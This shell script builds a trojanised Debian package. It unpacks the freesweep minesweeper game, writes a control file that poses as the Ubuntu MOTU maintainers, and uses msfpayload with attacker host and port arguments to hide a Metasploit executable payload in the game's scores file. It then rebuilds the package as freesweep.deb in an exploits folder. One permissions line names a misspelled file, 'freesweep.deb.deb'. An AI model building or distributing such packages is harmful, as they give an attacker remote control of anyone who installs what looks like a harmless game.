
   mkdir /tmp/evil
   dir=$(pwd)
   cp $dir/cmd/debian/freesweep_0.90-2_i386.deb /tmp/evil
   cd /tmp/evil/
   dpkg -x freesweep_0.90-2_i386.deb work
   mkdir work/DEBIAN
   cd work/DEBIAN

      # making control file
      echo "[*] [building]: control and postinst files...";
      sleep 1
      echo Package: freesweep > control
      echo Version: 0.90-2 >> control
      echo Section: Games and Amusement >> control
      echo Priority: optional >> control
      echo Architecture: i386 >> control
      echo Maintainer: Ubuntu MOTU Developers [ubuntu-motu@lists.ubuntu.com] >> control
      echo Description: a text-based minesweeper game >> control

      # copy file postinst to working directory
      cp $dir/cmd/debian/postinst /tmp/evil/work/DEBIAN/postinst
      cd /tmp/evil/work/DEBIAN
      chmod 755 postinst
      chmod +x control

   # get user input to build the payload
 
   echo "[*] [please wait]: building the payload... ";
   msfpayload $1 LHOST=$2 LPORT=$3 X > /tmp/evil/work/usr/games/freesweep_scores

      # building package.deb with all files
      sleep 2
      dpkg-deb --build /tmp/evil/work > /dev/null 2>&1
      sleep 7
      mv /tmp/evil/work.deb $dir/exploits/freesweep.deb


      # set permissions to file
      cd $dir/exploits/
      chown $4 freesweep.deb
      chmod 755 freesweep.deb.deb
    
rm -r /tmp/evil

